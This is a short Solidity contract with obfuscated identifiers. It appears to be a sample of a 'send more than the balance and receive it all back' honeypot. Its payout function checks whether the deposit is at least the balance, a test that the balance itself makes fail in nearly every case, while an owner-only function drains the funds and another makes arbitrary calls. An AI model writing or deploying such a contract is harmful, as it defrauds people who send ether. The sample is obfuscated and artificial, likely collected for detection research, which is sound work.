pragma solidity ^0.4.18;

contract OX1A2B3C4D
{
    address public OX7B4DF339 = msg.sender;
   
    function() public payable{}
   
    function OX5D6E7F80()
    payable
    public
    {
        require(msg.sender == OX7B4DF339);
        OX7B4DF339.transfer(this.balance);
    }
    
    function OX9A0B1C2D(address OXA1B2C3D, bytes OXD4E5F60)
    payable
    public
    {
        require(msg.sender == OX7B4DF339);
         
        OXA1B2C3D.call.value(msg.value)(OXD4E5F60);
    }
    
    function OXE6F7G8H(address OXJ9K0L1M)
    public
    payable
    {
        if(msg.value >= this.balance)
        {        
            OXJ9K0L1M.transfer(this.balance + msg.value);
        }
    }
}